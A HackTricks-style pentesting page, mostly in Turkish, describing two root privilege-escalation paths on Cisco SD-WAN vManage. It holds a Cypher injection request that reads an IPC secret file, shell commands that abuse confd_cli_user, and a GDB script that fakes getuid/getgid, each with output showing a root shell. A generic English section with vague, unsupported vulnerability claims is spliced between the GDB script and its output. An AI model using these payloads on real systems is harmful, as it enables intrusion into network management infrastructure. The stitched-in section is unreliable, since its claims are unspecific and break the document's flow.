# Cisco - vmanage

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**'a PR göndererek paylaşın.

</details>

## Yol 1

(Örnek [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) adresinden alınmıştır)

Biraz [belgelere](http://66.218.245.39/doc/html/rn03re18.html) göz attıktan sonra, `confd` ve farklı ikili dosyalarla ilgili (Cisco web sitesindeki bir hesapla erişilebilir) bazı belgelere göre, IPC soketini kimlik doğrulamak için `/etc/confd/confd_ipc_secret` konumunda bir gizli kullanıldığını bulduk:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Hatırlayın, Neo4j örneğimiz var mı? Bu, `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da bize önceki zafiyeti kullanarak dosyayı almayı sağlıyor:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` programı komut satırı argümanlarını desteklemez, ancak `/usr/bin/confd_cli_user`'ı argümanlarla çağırır. Bu nedenle, kendi argüman setimizle `/usr/bin/confd_cli_user`'ı doğrudan çağırabiliriz. Ancak mevcut yetkilerimizle okunabilir değil, bu yüzden rootfs'ten alıp scp kullanarak kopyalamamız, yardımı okumamız ve kabuğu elde etmek için kullanmamız gerekiyor:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Yol 2

(Örnek: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Synacktiv ekibinin blog¹'ünde, bir root kabuğu elde etmek için zarif bir yol tarif edilmiştir, ancak dezavantajı yalnızca root tarafından okunabilen `/usr/bin/confd_cli_user` kopyasını elde etmeyi gerektirmesidir. Ben, bu tür zorluklar olmadan root ayrıcalığına yükseltmek için başka bir yol buldum.

`/usr/bin/confd_cli` ikili dosyasını parçaladığımda aşağıdakileri gözlemledim:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
"ps aux" komutunu çalıştırdığımda aşağıdakileri gözlemledim (_not -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ben, "confd\_cli" programının, giriş yapmış kullanıcıdan topladığı kullanıcı kimliği ve grup kimliğini "cmdptywrapper" uygulamasına ilettiğini varsaydım.

İlk denemem, "cmdptywrapper"ı doğrudan çalıştırmak ve ona `-g 0 -u 0` sağlamaktı, ancak başarısız oldu. Görünüşe göre bir dosya tanımlayıcısı (-i 1015) yolda bir yerde oluşturuldu ve onu sahteleyemiyorum.

Synacktiv'in blogunda belirtildiği gibi (son örnek), `confd_cli` programı komut satırı argümanını desteklemiyor, ancak onu bir hata ayıklayıcıyla etkileyebilirim ve neyse ki sistemde GDB bulunuyor.

API'yi zorlamak için bir GDB betiği oluşturdum ve `getuid` ve `getgid` işlevlerinin 0 değerini döndürmesini sağladım. Zaten deserializasyon RCE aracılığıyla "vmanage" ayrıcalığına sahip olduğum için, `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
# Cisco vManage

## Introduction

Cisco vManage is a cloud-based network management platform that provides centralized control and monitoring of Cisco SD-WAN devices. It allows network administrators to configure, monitor, and troubleshoot their SD-WAN infrastructure.

## Privilege Escalation

### Default Credentials

Cisco vManage uses default credentials for initial access. The default username is `admin` and the default password is `admin`. It is important to change these default credentials to prevent unauthorized access.

### Command Injection

Cisco vManage is vulnerable to command injection attacks. An attacker can exploit this vulnerability by injecting malicious commands into user input fields. This can lead to remote code execution and privilege escalation.

To exploit this vulnerability, an attacker needs to identify the vulnerable input fields and inject the malicious commands. This can be done by analyzing the application's source code or by using automated tools like Burp Suite.

Once the attacker successfully injects the malicious commands, they can execute arbitrary commands on the underlying operating system with the privileges of the application.

### File Upload

Cisco vManage allows users to upload files for various purposes. However, it does not properly validate the uploaded files, which can lead to privilege escalation.

An attacker can exploit this vulnerability by uploading a malicious file that contains a payload. Once the file is uploaded, the attacker can trigger the payload to execute arbitrary commands on the underlying operating system with the privileges of the application.

To exploit this vulnerability, an attacker needs to identify the file upload functionality and upload a malicious file. This can be done by analyzing the application's source code or by using automated tools like Burp Suite.

### Remote Code Execution

Cisco vManage is vulnerable to remote code execution attacks. An attacker can exploit this vulnerability by injecting malicious code into user input fields or by uploading a malicious file.

To exploit this vulnerability, an attacker needs to identify the vulnerable input fields or the file upload functionality. Once the attacker successfully injects the malicious code or uploads the malicious file, they can execute arbitrary commands on the underlying operating system with the privileges of the application.

## Conclusion

Privilege escalation in Cisco vManage can be achieved through default credentials, command injection, file upload, and remote code execution vulnerabilities. It is important to secure Cisco vManage by changing the default credentials, implementing input validation, and properly validating uploaded files. Regular security assessments and patching are also recommended to mitigate these vulnerabilities.
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT koleksiyonumuzu**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
